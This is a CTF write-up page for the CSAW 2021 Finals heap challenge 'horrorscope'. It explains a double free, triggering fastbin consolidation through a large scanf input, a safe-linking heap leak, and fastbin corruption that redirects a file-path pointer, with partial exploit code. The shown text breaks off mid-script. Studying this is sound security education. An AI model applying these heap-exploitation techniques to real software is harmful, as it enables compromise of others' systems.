@@ -1,0 +1,317 @@
+<!DOCTYPE html><html lang="en" data-astro-cid-dxom2xcl> <head><!-- Global Metadata --><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><meta name="generator" content="Astro v4.16.18"><!-- Font preloads --><link rel="preload" href="/fonts/atkinson-regular.woff" as="font" type="font/woff" crossorigin><link rel="preload" href="/fonts/atkinson-bold.woff" as="font" type="font/woff" crossorigin><!-- Canonical URL --><link rel="canonical" href="https://localhost:3000/writeups/2021-12-22-horrorscope/"><!-- Primary Meta Tags --><title>CSAW CTF 2021 Finals - horrorscope</title><meta name="title" content="CSAW CTF 2021 Finals - horrorscope"><meta name="description" content="Fighting against libc to consolidate fastbins"><!-- Open Graph / Facebook --><meta property="og:type" content="website"><meta property="og:url" content="https://localhost:3000/writeups/2021-12-22-horrorscope/"><meta property="og:title" content="CSAW CTF 2021 Finals - horrorscope"><meta property="og:description" content="Fighting against libc to consolidate fastbins"><meta property="og:image" content="https://localhost:3000/blog-placeholder-1.jpg"><!-- Twitter --><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://localhost:3000/writeups/2021-12-22-horrorscope/"><meta property="twitter:title" content="CSAW CTF 2021 Finals - horrorscope"><meta property="twitter:description" content="Fighting against libc to consolidate fastbins"><meta property="twitter:image" content="https://localhost:3000/blog-placeholder-1.jpg"><style>:root{--accent: #fea819;--accent-dark: #ac7010}@font-face{font-family:Atkinson;src:url(/fonts/atkinson-regular.woff) format("woff");font-weight:400;font-style:normal;font-display:swap}@font-face{font-family:Atkinson;src:url(/fonts/atkinson-bold.woff) format("woff");font-weight:700;font-style:normal;font-display:swap}body{font-family:Atkinson,sans-serif;margin:0;padding:0;text-align:left;background:#171717 no-repeat;background-size:100% 600px;word-wrap:break-word;overflow-wrap:break-word;color:#aaa;font-size:20px;line-height:1.7}main{width:720px;max-width:calc(100% - 2em);margin:auto;padding:3em 1em}h1,h2,h3,h4,h5,h6{margin:0 0 .5rem;color:#fff;line-height:1.2}h1{font-size:3.052em}h2{font-size:2.441em}h3{font-size:1.953em}h4{font-size:1.563em}h5{font-size:1.25em}strong,b{font-weight:700}a,a:hover{color:var(--accent)}p{margin-bottom:1em}.prose p{margin-bottom:2em}textarea{width:100%;font-size:16px}input{font-size:16px}table{width:100%}img{max-width:100%;height:auto;border-radius:8px}code{padding:2px 5px;background-color:#1f1f1f;border-radius:2px}pre{padding:1.5em;border-radius:8px}pre>code{all:unset;font-size:.9em}blockquote{border-left:4px solid var(--accent);padding:0 0 0 20px;margin:0;font-size:1.333em}hr{border:none;border-top:1px solid #e9e9e9}@media (max-width: 720px){body{font-size:18px}main{padding:1em}}.sr-only{border:0;padding:0;margin:0;position:absolute!important;height:1px;width:1px;overflow:hidden;clip:rect(1px 1px 1px 1px);clip:rect(1px,1px,1px,1px);clip-path:inset(50%);white-space:nowrap}a[data-astro-cid-eimmu3lg]{display:inline-block;text-decoration:none}a[data-astro-cid-eimmu3lg].active{font-weight:bolder;text-decoration:underline}header[data-astro-cid-3ef6ksr2]{margin:0;padding:0 1em;background:#1f1f1f;box-shadow:0 2px 8px rgba(var(--black),5%)}h2[data-astro-cid-3ef6ksr2]{margin:0;font-size:1em}h2[data-astro-cid-3ef6ksr2] a[data-astro-cid-3ef6ksr2],h2[data-astro-cid-3ef6ksr2] a[data-astro-cid-3ef6ksr2].active{text-decoration:none}nav[data-astro-cid-3ef6ksr2]{display:flex;align-items:center;justify-content:space-between}nav[data-astro-cid-3ef6ksr2] a[data-astro-cid-3ef6ksr2]{padding:1em .5em;color:var(--black);border-bottom:4px solid transparent;text-decoration:none}nav[data-astro-cid-3ef6ksr2] a[data-astro-cid-3ef6ksr2].active{text-decoration:none;border-bottom-color:var(--accent)}.social-links[data-astro-cid-3ef6ksr2],.social-links[data-astro-cid-3ef6ksr2] a[data-astro-cid-3ef6ksr2]{display:flex}@media (max-width: 720px){.social-links[data-astro-cid-3ef6ksr2]{display:none}}footer[data-astro-cid-sz7xmlte]{padding:2em 1em 6em;background:linear-gradient(var(--gray-gradient)) no-repeat;color:rgb(var(--gray));text-align:center}.social-links[data-astro-cid-sz7xmlte]{display:flex;justify-content:center;gap:1em;margin-top:1em}.social-links[data-astro-cid-sz7xmlte] a[data-astro-cid-sz7xmlte]{text-decoration:none;color:rgb(var(--gray))}.social-links[data-astro-cid-sz7xmlte] a[data-astro-cid-sz7xmlte]:hover{color:rgb(var(--gray-dark))}
+main[data-astro-cid-dxom2xcl]{width:calc(100% - 2em);max-width:100%;margin:0}.hero-image[data-astro-cid-dxom2xcl]{width:100%}.hero-image[data-astro-cid-dxom2xcl] img[data-astro-cid-dxom2xcl]{display:block;margin:0 auto;border-radius:12px;box-shadow:var(--box-shadow)}.prose[data-astro-cid-dxom2xcl]{width:75%;max-width:calc(100% - 2em);margin:auto;padding:1em;color:rgb(var(--gray-dark))}.title[data-astro-cid-dxom2xcl]{margin-bottom:1em;padding:1em 0;text-align:center;line-height:1}.title[data-astro-cid-dxom2xcl] h1[data-astro-cid-dxom2xcl]{margin:0 0 .5em}.date[data-astro-cid-dxom2xcl]{margin-bottom:.5em;color:rgb(var(--gray))}.last-updated-on[data-astro-cid-dxom2xcl]{font-style:italic}
+</style></head> <body data-astro-cid-dxom2xcl> <header data-astro-cid-3ef6ksr2> <nav data-astro-cid-3ef6ksr2> <a href="/" style="padding: 1rem 0 0 0;" data-astro-cid-3ef6ksr2> <img src="/new_tower_logo.png" alt="Tower of Hanoi Logo" width="50rem" height="50rem" style="border-radius: 0;" data-astro-cid-3ef6ksr2> </a> <div class="internal-links" data-astro-cid-3ef6ksr2> <a href="/" data-astro-cid-3ef6ksr2 data-astro-cid-eimmu3lg> Home </a>  <a href="/blog" data-astro-cid-3ef6ksr2 data-astro-cid-eimmu3lg> Blogposts </a>  <a href="/writeups" class="active" data-astro-cid-3ef6ksr2 data-astro-cid-eimmu3lg> Writeups </a>  <a href="/about" data-astro-cid-3ef6ksr2 data-astro-cid-eimmu3lg> About </a>  </div> <div class="social-links" data-astro-cid-3ef6ksr2> <a href="https://x.com/towerofhanoi" target="_blank" data-astro-cid-3ef6ksr2> <span class="sr-only" data-astro-cid-3ef6ksr2>Follow Tower of Hanoi on Twitter</span> <svg viewBox="0 0 16 16" aria-hidden="true" width="32" height="32" data-astro-cid-3ef6ksr2><path fill="currentColor" d="M5.026 15c6.038 0 9.341-5.003 9.341-9.334 0-.14 0-.282-.006-.422A6.685 6.685 0 0 0 16 3.542a6.658 6.658 0 0 1-1.889.518 3.301 3.301 0 0 0 1.447-1.817 6.533 6.533 0 0 1-2.087.793A3.286 3.286 0 0 0 7.875 6.03a9.325 9.325 0 0 1-6.767-3.429 3.289 3.289 0 0 0 1.018 4.382A3.323 3.323 0 0 1 .64 6.575v.045a3.288 3.288 0 0 0 2.632 3.218 3.203 3.203 0 0 1-.865.115 3.23 3.23 0 0 1-.614-.057 3.283 3.283 0 0 0 3.067 2.277A6.588 6.588 0 0 1 .78 13.58a6.32 6.32 0 0 1-.78-.045A9.344 9.344 0 0 0 5.026 15z" data-astro-cid-3ef6ksr2></path></svg> </a> <a href="https://github.com/towerofhanoi" target="_blank" data-astro-cid-3ef6ksr2> <span class="sr-only" data-astro-cid-3ef6ksr2>Go to Tower of Hanoi's GitHub repo</span> <svg viewBox="0 0 16 16" aria-hidden="true" width="32" height="32" data-astro-cid-3ef6ksr2><path fill="currentColor" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.012 8.012 0 0 0 16 8c0-4.42-3.58-8-8-8z" data-astro-cid-3ef6ksr2></path></svg> </a> <a href="https://ctftime.org/team/300" target="_blank" data-astro-cid-3ef6ksr2> <span class="sr-only" data-astro-cid-3ef6ksr2>Go to Tower of Hanoi's CTF Time page</span> <svg viewBox="0 0 16 16" width="32" height="32" data-astro-cid-3ef6ksr2> <path fill="currentColor" d="M 0,0 H 16 V 16 H 0 L 4.7205698,7.7838485 Z" data-astro-cid-3ef6ksr2></path> </svg> </a> </div> </nav> </header>  <main data-astro-cid-dxom2xcl> <article data-astro-cid-dxom2xcl> <div class="hero-image" data-astro-cid-dxom2xcl> <img width="720" height="360" src="/writeup_images/csaw21.png" alt="" data-astro-cid-dxom2xcl> </div> <div class="prose" data-astro-cid-dxom2xcl> <div class="title" data-astro-cid-dxom2xcl> <div class="date" data-astro-cid-dxom2xcl> <time datetime="2021-12-22T13:17:00.000Z"> Dec 22, 2021 </time>  </div> <h1 data-astro-cid-dxom2xcl>CSAW CTF 2021 Finals - horrorscope</h1> <h3 data-astro-cid-dxom2xcl> by Tito Sacchi</h3> <hr data-astro-cid-dxom2xcl> </div>  <h1 id="horrorscope-csaw-ctf-2021-finals">horrorscope (CSAW CTF 2021 Finals)</h1>
+<p>I worked on this challenge as an exercise after those from our team who
+participated in the CTF told me that it would be a nice journey through unusual
+glibc malloc internals. I found this heap exploitation challenge quite difficult
+because at first glance I had no idea how to solve it; it really took me some
+time to discover that in some cases glibc consolidates fastbin chunks. Even
+after that, I had a hard time figuring out how to use this to write the exploit
+— the final script was unnecessarily complex and performed two different
+consolidations. I’m going to explain a simpler and cleaner version that I put up
+while writing the writeup. I will give detailed explanations only of the
+functions and memory structures that are more relevant for the exploit.</p>
+<p>Files: <a href="/writeup_files/horrorscope/horrorscope">horrorscope</a>,
+<a href="/writeup_files/horrorscope/Dockerfile">Dockerfile</a></p>
+<h2 id="step-0-setup">Step 0: setup</h2>
+<p>The challenge uses a very recent glibc (2.34) and runs on Ubuntu 21.10. The
+provided Dockerfile used xinetd and configuration files were missing, so I
+replaced it with socat and launched the challenge with docker-compose.</p>
+<p>Unfortunately even after installing <code>libc6-dbg</code> in the container, debug symbols
+weren’t loaded in GDB and I couldn’t use pwngdb heap commands. I got debugging
+symbols to work while cleaning up the exploit by copying the entire
+<code>/usr/lib/debug</code> directory from the container to the host and passing <code>set debug-file-directory ...</code> to GDB.</p>
+<h2 id="step-1-looking-for-vulnerabilities">Step 1: looking for vulnerabilities</h2>
+<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>❯ pwn checksec ./horrorscope</span></span>
+<span class="line"><span>[*] '/home/tito/csaw/horrorscope/horrorscope'</span></span>
+<span class="line"><span>Arch:     amd64-64-little</span></span>
+<span class="line"><span>RELRO:    Full RELRO</span></span>
+<span class="line"><span>Stack:    Canary found</span></span>
+<span class="line"><span>NX:       NX enabled</span></span>
+<span class="line"><span>PIE:      PIE enabled</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>❯ ./ld-linux-x86-64.so.2 --preload ./libc-2.34.so ./horrorscope</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>Welcome to the CSAW Oracle (v2.34)!!</span></span>
+<span class="line"><span>We offer all manners of predicting your future and fate!</span></span>
+<span class="line"><span>If you're lucky, that fate will include reading the ./flag.txt!!</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span> -----------------------------------------</span></span>
+<span class="line"><span> Option 0: Query horoscope sign birthdates</span></span>
+<span class="line"><span> Option 1: Ask the Magic 8 Ball a question</span></span>
+<span class="line"><span> Option 2: Open a fortune cookie</span></span>
+<span class="line"><span> Option 3: Read a saved 8 ball fortune</span></span>
+<span class="line"><span> Option 4: Read a saved cookie fortune</span></span>
+<span class="line"><span> Option 5: Delete a saved 8 ball fortune</span></span>
+<span class="line"><span> Option 6: Visit the Oracle</span></span>
+<span class="line"><span> Option 7: Get Lucky Number</span></span>
+<span class="line"><span> Option 8: Save Lucky Number</span></span>
+<span class="line"><span> Option 9: Exit</span></span>
+<span class="line"><span> ></span></span>
+<span class="line"><span></span></span></code></pre>
+<p>Ok, every protection is enabled. Let’s have a look at the different
+functions that the binary presents us at the menu.</p>
+<p><strong>Option 0</strong>: the function is called <code>sign</code> in the binary. It checks whether a
+global variable (<code>globals</code>) is <code>NULL</code> and allocates a buffer of size 0x10 with
+<code>calloc</code> if it is. Then it lets us write 16 bytes in the buffer pointed by the
+global variable.</p>
+<p><strong>Option 1</strong>: the function is called <code>ask_8ball</code>. It allocates with <code>malloc</code> a
+buffer of size 0x70 and asks the user for input. The input is not stored
+directly at the beginning of the allocated buffer but at <code>buffer + 17</code> instead,
+because it gets prepended the string <code>Oh Magic 8 Ball, </code>. It then outputs some
+useless string (the fortune) depending on out input, and then asks us whether we
+want to save the fortune. If the answer is <code>N</code>, it frees the chunk; otherwise,
+it appends a struct to global array (called <code>f</code>) in <code>.bss</code>. The struct is
+constructed as follows:</p>
+<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#CB7676">struct</span><span style="color:#DBD7CAEE"> magic_ball_fortune </span><span style="color:#666666">{</span></span>
+<span class="line"><span style="color:#CB7676">    char*</span><span style="color:#DBD7CAEE"> user_string</span><span style="color:#666666">;</span></span>
+<span class="line"><span style="color:#CB7676">    char</span><span style="color:#BD976A"> response</span><span style="color:#666666">[</span><span style="color:#4C9A91">32</span><span style="color:#666666">];</span></span>
+<span class="line"><span style="color:#666666">}</span></span>
+<span class="line"></span></code></pre>
+<p><code>user_string</code> holds a pointer to the buffer that was dynamically allocated
+before, containing <code>Oh Magic 8 Ball, </code> followed by our input. We can store at
+most 10 8-ball fortunes (<code>f</code> is 400 bytes long) and read them later on with
+option 3.</p>
+<p><strong>Option 2</strong>: this is <code>get_cookie</code> and it’s where the main vulnerability lies,
+as we will see later. We can ask for a fortune cookie and this will be read from
+a file (<code>./cookies.txt</code>). A random line will be chosen from that file and will
+be placed in a 0x70-sized buffer allocated with <code>calloc</code>. A pointer to the
+resulting buffer is appended to some kind of singly-linked list stored at the
+symbol <code>c</code>, in <code>.bss</code>. The last quadword of the buffer then contains a pointer
+that points back to the linked list entry in <code>.bss</code>:</p>
+<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#CB7676">struct</span><span style="color:#DBD7CAEE"> cookie_fortune </span><span style="color:#666666">{</span><span style="color:#758575DD"> /* size = 0x70 */</span></span>
+<span class="line"><span style="color:#CB7676">    char</span><span style="color:#BD976A"> fortune</span><span style="color:#666666">[</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">68</span><span style="color:#666666">];</span></span>
+<span class="line"><span style="color:#DBD7CAEE">    linked_list_entry</span><span style="color:#CB7676">*</span><span style="color:#DBD7CAEE"> my_entry</span><span style="color:#666666">;</span></span>
+<span class="line"><span style="color:#666666">}</span></span>
+<span class="line"></span></code></pre>
+<p>Each entry in the global array <code>c</code> (as in <code>cookies</code>) is composed of two quadwords:</p>
+<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#CB7676">struct</span><span style="color:#DBD7CAEE"> linked_list_entry </span><span style="color:#666666">{</span><span style="color:#758575DD"> /* size = 0x10 */</span></span>
+<span class="line"><span style="color:#DBD7CAEE">    cookie_fortune</span><span style="color:#CB7676">*</span><span style="color:#DBD7CAEE"> bck</span><span style="color:#666666">;</span></span>
+<span class="line"><span style="color:#DBD7CAEE">    cookie_fortune</span><span style="color:#CB7676">*</span><span style="color:#DBD7CAEE"> this</span><span style="color:#666666">;</span></span>
+<span class="line"><span style="color:#666666">}</span></span>
+<span class="line"></span></code></pre>
+<p>A memory dump is worth a thousand words:</p>
+<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>pwndbg> x/20gx &#x26;c</span></span>
+<span class="line"><span>#                    (bck)               (this)</span></span>
+<span class="line"><span>0x55555555a0a0 c:    0x0000000000000000  0x000055555555b380 (cookie 0)</span></span>
+<span class="line"><span>0x55555555a0b0 c+16: 0x000055555555b380  0x000055555555b400 (cookie 1)</span></span>
+<span class="line"><span>0x55555555a0c0 c+32: 0x000055555555b400  0x000055555555b480 (cookie 2)</span></span>
+<span class="line"><span>0x55555555a0d0 c+48: 0x000055555555b480  0x000055555555b500 (cookie 3)</span></span>
+<span class="line"><span>0x55555555a0e0 c+64: 0x000055555555b500  0x000055555555b580 (cookie 4)</span></span>
+<span class="line"><span>0x55555555a0f0 c+80: 0x0000000000000000  0x0000000000000000</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>pwndbg> x/20gx 0x000055555555b380</span></span>
+<span class="line"><span>0x55555555b380: 0x0000000000003232  0x0000000000000000  ⎤</span></span>
+<span class="line"><span>0x55555555b390: 0x0000000000000000  0x0000000000000000  ⎥</span></span>
+<span class="line"><span>0x55555555b3a0: 0x0000000000000000  0x0000000000000000  ⎥ buffer</span></span>
+<span class="line"><span>0x55555555b3b0: 0x0000000000000000  0x0000000000000000  ⎥</span></span>
+<span class="line"><span>0x55555555b3c0: 0x0000000000000000  0x0000000000000000  ⎥</span></span>
+<span class="line"><span>0x55555555b3d0: 0x0000000000000000  0x0000000000000000  ⎦</span></span>
+<span class="line"><span>0x55555555b3e0: 0x0000000000000000  0x000055555555a0a0</span></span>
+<span class="line"><span>                                    ┗━━→ points back to the entry in c</span></span>
+<span class="line"><span></span></span></code></pre>
+<p>We can store at most 33 cookies in <code>c</code>, and if we ask for a fortune cookie when
+the list is full, <code>delete_cookie</code> is called. This function is quite hard to
+read, mainly because there are some instructions that reference the address
+<code>c+8</code> directly and this confuses IDA. We can choose which cookie we want to free
+and then the functions performs some integrity checks on the linked list.
+Assuming <code>idx</code> (in the range <code>0..32</code>) is the cookie to delete, it basically
+checks the invariants <code>c[idx].this->my_entry == &#x26;c[idx]</code>, <code>c[idx+1].bck == c[idx].this</code>, <code>c[idx].bck == c[idx-1].this</code>, <code>c[idx].bck != c[idx].this</code>.</p>
+<p>Then, <code>delete_cookie</code> <code>free()</code>s the <code>cookie_fortune</code> at <code>c[idx].this</code> and then
+shifts all the entries in the range <code>(idx+1)..32</code> backwards by 1 in <code>c</code>. It does
+so with an complex while loop with some special cases for cookie 0 and cookie
+32. However, it has a serious flaw: it does not overwrite <code>c[idx].this</code>! This is
+the main vulnerability that will allow us to have a double free.</p>
+<p>Let me explain in more detail. Consider the memory dump above, and suppose we
+went on filling the list until the end. After <code>delete_cookie()</code> has deleted
+cookie 4, for example, <code>c</code> will contain:</p>
+<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>pwndbg> x/20gx &#x26;c</span></span>
+<span class="line"><span>0x55555555a0a0 c:    0x0000000000000000  0x000055555555b380 (cookie 0)</span></span>
+<span class="line"><span>0x55555555a0b0 c+16: 0x000055555555b380  0x000055555555b400 (cookie 1)</span></span>
+<span class="line"><span>0x55555555a0c0 c+32: 0x000055555555b400  0x000055555555b480 ...</span></span>
+<span class="line"><span>0x55555555a0d0 c+48: 0x000055555555b480  0x000055555555b500</span></span>
+<span class="line"><span>0x55555555a0e0 c+64: 0x000055555555b500  0x000055555555b580 | !!!</span></span>
+<span class="line"><span>0x55555555a0f0 c+80: 0x000055555555b600  0x000055555555b680</span></span>
+<span class="line"><span>0x55555555a100 c+96: 0x000055555555b680  0x000055555555b700</span></span>
+<span class="line"><span>...</span></span>
+<span class="line"><span></span></span></code></pre>
+<p>As you can see, <code>delete_cookie</code> shifted cookies  in the range <code>5..32</code> back by 1
+position, but it did not update <code>c[4].this</code> and it is still pointing at the
+freed buffer!</p>
+<p>Note that <code>delete_cookie</code> is corrupting its own list, but it also performs
+integrity checks as I explained above: this means that if we free cookie 1, we
+won’t be able to free cookies 1 or 2 in a later stage, because corruption will
+be detected. Cookie 32 (the last one) is an exception, because there is no
+cookie 33 to check the invariant <code>c[idx].this == c[idx+1].bck</code>!</p>
+<p><strong>Option 3</strong>: Ok, the hardest part of the analysis is done.
+<code>print_8ball_fortune</code> allows the user to read one of the 8-ball fortunes that
+was saved before with option 2. It gets the buffer address from <code>f</code> and prints
+both the user input and the magic ball response.</p>
+<p><strong>Option 4</strong>: <code>print_cookie_fortune</code> prints the content of one of the cookies
+stored in <code>c</code> chosen by the user. It prints the buffer stored at <code>c[idx].this</code>.</p>
+<p><strong>Option 5</strong>: this function (<code>delete_8ball_fortune</code>) can be used to free the
+last 8-ball fortune that has been saved with option 2. We cannot choose which of
+the fortunes stored in <code>f</code> to delete — we can only delete the one at the end.</p>
+<p><strong>Option 6</strong>: this function prints a random line from another file
+(<code>./oracle.txt</code>). It allocates a very big chunk with <code>malloc</code> (size 0x390) to
+read the file contents. We will use this function in the final stage of the
+exploit.</p>
+<p><strong>Option 7</strong>: <code>get_lucky_num</code>, similarly to <code>sign</code>, uses a global variable to
+store a pointer to a buffer (the symbol is called <code>buf</code>). If it is <code>NULL</code>, it
+allocates a buffer of size 0x10 with <code>calloc</code> and asks the user for his name
+that will be stored there. It then outputs some useless value. If called another
+time, it won’t ask for input again, because <code>buf</code> still holds the pointer to the
+user’s previous input and is not <code>NULL</code> anymore.</p>
+<p><strong>Option 8</strong>: <code>store_lucky_num</code> unintuitively does not share any global state
+with <code>get_lucky_num</code>. The generated pseudocode is very easy to read: it uses a
+global variable (<code>ptr</code>) to store a pointer to the user’s “lucky number”, a
+buffer of size 8 allocated with <code>calloc</code>. We can delete our lucky number
+(<code>free()</code> the buffer), create it again (<code>calloc()</code>) and update it (change the
+contents of the buffer pointed by <code>ptr</code>) how many times we want.</p>
+<h2 id="step-2-planning-the-exploit">Step 2: planning the exploit</h2>
+<p>This really took some time and commitment! We only have <code>malloc()</code>s, <code>calloc()</code>s
+and <code>free()</code>s of fixed sizes. We can perform a double free on cookie 32 because
+it is the only case <code>delete_cookie</code> won’t corrupt the list. However, we have no
+way to edit the forward pointer in the chunk before we free it again, because
+option 1 (<code>ask_8ball</code>) writes <code>Oh Magic 8 Ball, </code> (17 bytes) in the buffer right
+before our input, and other functions don’t allocate chunks of the same size as
+<code>get_cookie</code>.</p>
+<p>I spent a few hours looking at the pseudocode without any idea. I thought that
+if I could consolidate the fastbin chunks maybe I could find a way to corrupt
+the chunk pointers; however, someone taught me that fastbins get <em>never</em>
+consolidated… But while reading the glibc sources in total despair, I
+discovered that there is a specific function inside <code>malloc.c</code> that does exactly
+this: <code>malloc_consolidate</code>. <code>call malloc_consolidate(&#x26;main_arena)</code> in GDB did
+exactly what I expected.</p>
+<p>I had to find a way to trigger the call to <code>malloc_consolidate()</code> — it occurs
+quite rarely in the ptmalloc allocator. It turned out that the easiest way to do
+that is to issue a largebin-sized allocation request to <code>malloc()</code>: see
+<a href="https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=e065785af77af72c17c773517c15b248b067b4ad;hb=ae37d06c7d127817ba43850f0f898b793d42aea7#l3837"><code>malloc/malloc.c</code>:3852 in glibc 2.34</a>.</p>
+<p>However we have no control over the size of the chunks allocated by the
+application and the largest one is smallbin-sized (<code>malloc(0x390)</code> in <code>oracle</code>).
+How can we <code>malloc()</code> more than 0x400?</p>
+<p>Well, this is the trick that I came up with: some internal libc functions use
+<code>malloc</code> and <code>free</code> internally, and <code>scanf</code> is one of them. And… the
+application is reading the user’s choices at the menu using <code>scanf()</code>! So
+sending a very large payload at the menu could trigger <code>malloc_consolidate()</code>. I
+was right: sending 1024 <code>'5'</code>s successfully consolidated the fastbins.</p>
+<h2 id="step-3-implementing-the-exploit">Step 3: implementing the exploit</h2>
+<p>The main idea is the following: we will allocate a cookie with
+<code>create_cookie()</code>, free it and then consolidate it with the top chunk. Then we
+will allocate a buffer of size 0x10 with <code>store_lucky_num()</code> right on the top
+chunk and it will end up exactly where the buffer of the just freed
+<code>cookie_fortune</code> was. We will free this buffer with <code>delete_cookie()</code> because of
+the bug explained above; we will still be able to edit its contents with
+<code>store_lucky_num()</code> and we will use that corrupt the fastbin forward pointer.</p>
+<p>We will use fastbin corruption to overwrite an address stored at <code>.data + 0x30</code>
+that points to the string <code>"./oracle.txt"</code>. This address is passed as a
+parameter to <code>open()</code> in <code>oracle</code> (option 6). I mean, why would you want to put
+a pointer to a static string in a R/W memory segment? It’s surely meant to be
+pwned! We will overwrite this pointer with the address of <code>"./flag.txt"</code>.
+Choosing option 6 will print a random line from <code>./flag.txt</code>!</p>
+<p>I will comment <a href="/writeup_files/horrorscope/exploit.py">the exploit</a>
+step by step (omitting utility functions for brevity).</p>
+<p>Firstly we fill the tcache for chunks of size 0x20, because the only chunk we
+will free of size 0x20 will be the lucky number created on the top chunk, and we
+want it to end up in fastbins. To fill the tcache we repeatedly create and
+delete 0x20-sized chunks with <code>calloc()</code> because it does not use the tcache and
+each call to <code>free()</code> will add one chunk on the tcachebin.</p>
+<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#4D9375">for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#666666">(</span><span style="color:#4C9A91">7</span><span style="color:#666666">):</span><span style="color:#758575DD"> # tcachebins contain at most 7 chunks</span></span>
+<span class="line"><span style="color:#758575DD">    # Will call store_lucky_num(), the content is not important</span></span>
+<span class="line"><span style="color:#DBD7CAEE">    create_lucky_number</span><span style="color:#666666">()</span></span>
+<span class="line"><span style="color:#DBD7CAEE">    delete_lucky_number</span><span style="color:#666666">()</span></span>
+<span class="line"></span></code></pre>
+<p>Then, we want to fill the cookie fortune linked list (<code>c</code>) because we can only
+free cookie fortunes when the list is full (33 elements).</p>
+<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#4D9375">for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#666666">(</span><span style="color:#4C9A91">33</span><span style="color:#666666">):</span></span>
+<span class="line"><span style="color:#DBD7CAEE">    create_cookie</span><span style="color:#666666">()</span></span>
+<span class="line"></span></code></pre>
+<p>Now we will fill the tcachebin for size 0x80 in the exact same way as above:
+<code>create_cookie()</code> uses <code>calloc()</code> internally. Note that we can’t just free
+cookies 0, 1, 2, … because list corruption will be detected, so we free
+cookies 1, 3, 5, …</p>
+<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#4D9375">for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#666666">(</span><span style="color:#4C9A91">7</span><span style="color:#666666">):</span></span>
+<span class="line"><span style="color:#DBD7CAEE">    delete_cookie</span><span style="color:#666666">(</span><span style="color:#4C9A91">2</span><span style="color:#CB7676">*</span><span style="color:#DBD7CAEE">i </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">)</span></span>
+<span class="line"><span style="color:#DBD7CAEE">    create_cookie</span><span style="color:#666666">()</span></span>
+<span class="line"></span></code></pre>
+<p>We will get a leak of the heap base address by reading inside the first
+<code>free()</code>d cookie fortune, which is the last one in the appropriate tcachebin. We
+will abuse the ‘safe linking’ pointer masking machenism introduces in glibc
+2.32. Its forward pointer is <code>NULL</code>. With safe linking, this is stored as <code>NULL ^ (cookie_addr >> 12) = cookie_addr >> 12</code>: reading the cookie yields the base
+address of the memory page where this chunk resides.</p>
+<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>                   ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━┓</span></span>
+<span class="line"><span>cookie_addr - 0x10 ┃ ...                       ┃ size | prev_inuse:   0x81 ┃</span></span>
+<span class="line"><span>                   ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━━━━━━━━━━━━┫</span></span>
+<span class="line"><span>cookie_addr        ┃ fwd ^ (cookie_addr >> 12) ┃ ...                       ┃</span></span>
+<span class="line"><span>                   ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━┫</span></span>
+<span class="line"><span>cookie_addr + 0x10 ┃ ...                                                   ┃</span></span>
+<span class="line"><span>                   ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛</span></span>
+<span class="line"><span></span></span></code></pre>
+<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#CB7676">def</span><span style="color:#80A665"> read_heap_leak</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">idx</span><span style="color:#666666">):</span></span>
